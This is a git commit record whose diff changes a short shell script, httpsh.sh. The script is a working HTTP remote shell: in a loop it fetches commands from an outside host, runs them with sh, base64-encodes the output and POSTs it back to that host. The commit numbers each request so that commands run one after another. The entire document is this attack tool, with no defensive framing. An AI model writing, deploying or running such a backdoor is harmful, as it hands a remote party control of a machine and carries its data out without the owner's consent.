aac1f7121e105e0c008b71ff7ced4d860f143923
fob-bb <58139757+fob-bb@users.noreply.github.com>
2019-11-24 16:34:42 -0500

    cache

--- httpsh.sh
+++ httpsh.sh
@@ -1,7 +1,8 @@
 set -eu
 H=https://exf.infose.cz/
 
+i=0
 while :; do
-        curl -s "${H}" | { sh | base64 -w0; echo; } | curl -X POST -s --data-binary @- --include "${H}"
-        exit 1
+        curl -s "${H}/$i" | { sh | base64 -w0; echo; } | curl -X POST -s --data-binary @- --include "${H}/p.$i"
+        i=$(( $i + 1 ))
 done
